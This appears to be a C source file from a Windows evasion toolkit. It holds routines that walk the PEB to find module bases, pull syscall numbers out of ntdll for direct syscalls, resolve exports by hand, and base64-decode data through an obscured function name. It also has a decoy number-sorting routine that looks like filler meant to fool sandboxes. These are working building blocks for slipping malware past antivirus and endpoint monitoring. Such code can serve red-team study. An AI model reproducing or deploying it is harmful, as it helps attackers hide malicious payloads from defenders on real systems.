#include "evasion.h"
#include <stdio.h>
#include <stdlib.h>
#include <winternl.h>

/*
Function to retrieve the base address of the module
*/
PVOID GetModBA(LPCWSTR moduleName)
{
    PPEB pPeb = (PPEB)__readgsqword(0x60); // 0x60 is PEB offset for x64
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pListEntry = &pLdr->InMemoryOrderModuleList;

    for (PLIST_ENTRY pEntry = pListEntry->Flink; pEntry != pListEntry; pEntry = pEntry->Flink)
    {
        PLDR_DATA_TABLE_ENTRY pDataTableEntry = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        // Extract the base name from the FullDllName
        LPCWSTR fullDllName = pDataTableEntry->FullDllName.Buffer;
        LPCWSTR baseDllName = wcsrchr(fullDllName, L'\\');
        baseDllName = (baseDllName != NULL) ? (baseDllName + 1) : fullDllName;

        if (wcsicmp(baseDllName, moduleName) == 0)
        {
            return pDataTableEntry->DllBase;
        }
    }
    return NULL;
}

DWORD GetSyid(LPCSTR functionName)
{
    PVOID ntdllBase = GetModBA(L"ntdll.dll");
    if (!ntdllBase)
        return 0;

    IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)ntdllBase;
    IMAGE_NT_HEADERS *ntHeaders = (IMAGE_NT_HEADERS *)((BYTE *)ntdllBase + dosHeader->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)((BYTE *)ntdllBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *addressOfFunctions = (DWORD *)((BYTE *)ntdllBase + exportDir->AddressOfFunctions);
    DWORD *addressOfNames = (DWORD *)((BYTE *)ntdllBase + exportDir->AddressOfNames);
    WORD *addressOfNameOrdinals = (WORD *)((BYTE *)ntdllBase + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++)
    {
        LPCSTR name = (LPCSTR)((BYTE *)ntdllBase + addressOfNames[i]);
        if (strcmp(name, functionName) == 0)
        {
            DWORD functionRVA = addressOfFunctions[addressOfNameOrdinals[i]];
            BYTE *functionPtr = (BYTE *)ntdllBase + functionRVA;
            // Syscall ID is stored at byte 4 (mov eax, XX)
            return *(DWORD *)(functionPtr + 4);
        }
    }
    return 0;
}

void SetSyid(DWORD value)
{
    smID = value;
}

// This table implements the mapping from 8-bit ascii value to 6-bit
// base64 value and it is used during the base64 decoding
// process. Since not all 8-bit values are used, some of them are
// mapped to -1, meaning that there is no 6-bit value associated with
// that 8-bit value.
//
int UNBASE64[] = {
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 0-11
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 12-23
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 24-35
    -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, // 36-47
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -2, // 48-59
    -1, 0, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,         // 60-71
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18,    // 72-83
    19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, // 84-95
    -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, // 96-107
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, // 108-119
    49, 50, 51, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 120-131
};

char *Bsfd(const char *encoded)
{
    int in_index = 0;
    int out_index = 0;
    char first, second, third, fourth;

    size_t len = strlen(encoded);
    if (len % 4 != 0)
        return NULL; // Invalid Base64 length

    size_t outLen = (len / 4) * 3;
    if (encoded[len - 1] == '=')
        outLen--;
    if (encoded[len - 2] == '=')
        outLen--;

    unsigned char *decoded = (unsigned char *)malloc(outLen + 1);
    if (!decoded)
        return NULL;

    while (in_index < len)
    {
        // check if next 4 byte of input is valid base64
        for (int i = 0; i < 4; i++)
        {
            if (((int)encoded[in_index + i] > 131) || UNBASE64[(int)encoded[in_index + i]] == -1)
            {
                fprintf(stderr, "Invalid base64 char, cannot decode: %c\n", encoded[in_index + i]);
                return (char *)decoded;
            }
        }

        // extract all bits and reconstruct original bytes
        first = UNBASE64[(int)encoded[in_index]];
        second = UNBASE64[(int)encoded[in_index + 1]];
        third = UNBASE64[(int)encoded[in_index + 2]];
        fourth = UNBASE64[(int)encoded[in_index + 3]];

        // reconstruct first byte
        decoded[out_index++] = (first << 2) | ((second & 0x30) >> 4);

        // reconstruct second byte
        if (encoded[in_index + 2] != '=')
        {
            decoded[out_index++] = ((second & 0xF) << 4) | ((third & 0x3C) >> 2);
        }

        // reconstruct third byte
        if (encoded[in_index + 3] != '=')
        {
            decoded[out_index++] = ((third & 0x3) << 6) | fourth;
        }

        in_index += 4;
    }

    decoded[out_index] = '\0';
    return (char *)decoded;
}

void SortNumbers()
{
    int numbers[ARRAY_SIZE];

    // Seed random number generator
    for (int i = 0; i < ARRAY_SIZE; i++)
    {
        numbers[i] = rand() % 10000; // Random number between 0-9999
    }

    // Simple Bubble Sort (Avoids needing qsort from stdlib)
    for (int i = 0; i < ARRAY_SIZE - 1; i++)
    {
        for (int j = 0; j < ARRAY_SIZE - i - 1; j++)
        {
            if (numbers[j] > numbers[j + 1])
            {
                int temp = numbers[j];
                numbers[j] = numbers[j + 1];
                numbers[j + 1] = temp;
            }
        }
    }

    // Compute the average of the sorted array
    long sum = 0;
    for (int i = 0; i < ARRAY_SIZE; i++)
    {
        sum += numbers[i];
    }
    float avg = (float)sum / ARRAY_SIZE;

    // Print final average
    printf("[*] Processed %d numbers. Average value: %.2f\n", ARRAY_SIZE, avg);
}

pMod GetMod(LPCSTR mod, LPCSTR fn)
{
    PPEB pPEB = (PPEB)__readgsqword(0x60);
    if (!pPEB)
    {
        printf("[!] Failed to retrieve PEB.\n");
        return NULL;
    }

    PPEB_LDR_DATA pLdr = pPEB->Ldr;
    if (!pLdr)
    {
        printf("[!] Failed to retrieve LDR data.\n");
        return NULL;
    }

    LIST_ENTRY *pListHead = &pLdr->InMemoryOrderModuleList;
    LIST_ENTRY *pEntry = pListHead->Flink;

    while (pEntry != pListHead)
    {
        PLDR_DATA_TABLE_ENTRY pDataTable = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (!pDataTable->DllBase)
        {
            pEntry = pEntry->Flink;
            continue;
        }

        // Get DLL base address
        HMODULE hModuleBase = (HMODULE)pDataTable->DllBase;
        WCHAR wDllName[MAX_PATH] = {0};
        memcpy(wDllName, pDataTable->FullDllName.Buffer, pDataTable->FullDllName.Length);

        // Convert to ANSI string
        char dllName[MAX_PATH] = {0};
        wcstombs(dllName, wDllName, MAX_PATH);

        // Normalize the name (convert to lowercase)
        for (int i = 0; dllName[i]; i++)
        {
            dllName[i] = tolower(dllName[i]);
        }

        if (strstr(dllName, mod))
        {
            // printf("[*] Found %s at: %p\n", mod, hModuleBase);

            // Locate Export Directory
            IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)hModuleBase;
            IMAGE_NT_HEADERS *ntHeaders = (IMAGE_NT_HEADERS *)((BYTE *)hModuleBase + dosHeader->e_lfanew);
            IMAGE_EXPORT_DIRECTORY *expDir = (IMAGE_EXPORT_DIRECTORY *)((BYTE *)hModuleBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            if (!expDir)
            {
                printf("[!] Export directory not found!\n");
                return NULL;
            }

            DWORD *names = (DWORD *)((BYTE *)hModuleBase + expDir->AddressOfNames);
            WORD *ordinals = (WORD *)((BYTE *)hModuleBase + expDir->AddressOfNameOrdinals);
            DWORD *functions = (DWORD *)((BYTE *)hModuleBase + expDir->AddressOfFunctions);

            for (DWORD i = 0; i < expDir->NumberOfNames; i++)
            {
                LPCSTR functionName = (LPCSTR)((BYTE *)hModuleBase + names[i]);
                if (strcmp(functionName, fn) == 0)
                {
                    // printf("[*] %s found at: %p\n", fn, (BYTE*)hModuleBase + functions[ordinals[i]]);
                    return (pMod)((BYTE *)hModuleBase + functions[ordinals[i]]);
                }
            }

            printf("[!] %s not found encoded %s exports.\n", fn, mod);
            return NULL;
        }

        pEntry = pEntry->Flink;
    }

    printf("[!] %s not found encoded PEB.\n", mod);
    return NULL;
}
